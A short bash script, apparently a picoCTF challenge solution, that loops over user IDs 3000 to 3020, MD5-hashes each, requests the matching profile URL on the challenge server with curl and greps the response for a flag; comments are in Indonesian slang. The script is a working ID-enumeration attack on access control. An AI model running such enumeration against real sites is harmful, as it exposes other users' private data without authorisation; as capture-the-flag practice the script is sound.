#!/bin/bash

TARGET_BASE="http://crystal-peak.picoctf.net:52311/profile/user"

echo "olololo huhuhuhuh"
echo "--------------------------"

for i in {3000..3020}
do
 
    HASH=$(echo -n $i | md5sum | awk '{print $1}')

    URL="${TARGET_BASE}/${HASH}"

    echo -n "Checking ID $i ($HASH): "

    # Curl dengan --silent bair ga berisik banhet
    RESPONSE=$(curl -s "$URL")

    # kentank bakar
    if [[ $RESPONSE == *"picoCTF{"* ]]; then
        echo -e "\n\n[!] FLAG FOUND at ID $i!"
        echo "$RESPONSE" | grep -o "picoCTF{[^}]*}"
        exit 0
    else
        echo "Not found."
    fi
done

echo "--------------------------"
echo "tis is de fleg bradar"
